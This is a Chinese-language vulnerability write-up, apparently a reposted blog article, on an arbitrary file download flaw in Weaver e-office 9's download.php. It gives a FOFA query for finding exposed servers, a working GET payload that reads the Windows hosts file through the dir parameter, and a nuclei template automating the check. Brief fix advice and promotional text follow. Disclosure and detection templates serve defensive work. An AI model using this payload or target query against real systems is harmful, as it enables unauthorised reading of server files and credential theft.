# 原创
：  泛微e-office download.php任意文件

# 泛微e-office download.php任意文件

### 0x01 应用介绍

泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案

### 0x02 影响版本及语法特征

泛微e-offcie9<br/> fofa：app=”泛微-EOffice” &amp;&amp; body=”您的浏览器处于弹出窗口阻止模式！建议您关闭”

### 0x03 漏洞复现

payload：/general/file_folder/file_new/neworedit/download.php?filename=hosts&amp;dir=C:\Windows\System32\drivers\etc\<br/> 直接使用get请求拼接该payload即可下载目标主机hosts文件

下载完成后打开文件查看<br/>  

<br/> 下载服务器文件复现成功

### nuclei

```
id: fanwei-E-Office-file-read
info:
  name: fanwei-E-Office-file-read
  author: fanwei-E-Office-file-read
  severity: critical
  tags: fanwei

http:
  - raw:
    - |
        GET /general/file_folder/file_new/neworedit/download.php?filename=hosts&amp;dir=C:\Windows\System32\drivers\etc\ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "127.0.0.1"
      - type: status
        status:
          - 200

```

### 修复建议

使用最新版本的应用

限制漏洞路径的访问

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/d5dd90298c6a4dabad57e3e050234f1e.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/990689a55616498ea7cd93d18660ffd4.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/533e0501bd2e478d927c97a476c2e356.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/9a44f35e8e8141f89392fae93c8dd0f7.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/185650910ae94d3999a992054a64eb3a.png" width="665"/>

应急响应笔记

学习路线
